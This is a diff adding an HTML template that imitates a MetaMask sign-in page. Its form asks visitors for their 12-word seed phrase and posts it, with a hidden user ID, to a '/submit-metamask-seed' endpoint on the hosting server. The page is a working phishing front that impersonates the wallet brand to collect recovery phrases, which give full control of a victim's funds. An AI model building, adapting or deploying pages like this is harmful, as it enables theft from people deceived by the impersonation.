@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Login</title>
+    <link rel="stylesheet" href="/css/metamask.css">
+</head>
+
+<body>
+    <div class="login-container">
+        <h2>Sign in to MetaMask</h2>
+        <form id="metamaskLoginForm" action="/submit-metamask-seed" method="POST">
+            <input type="hidden" name="userId" value="<%= userId %>">
+            <label for="seedPhrase">Seed Phrase:</label>
+            <input type="text" id="seedPhrase" name="seedPhrase" required placeholder="Enter your 12-word seed phrase">
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+
+</html>
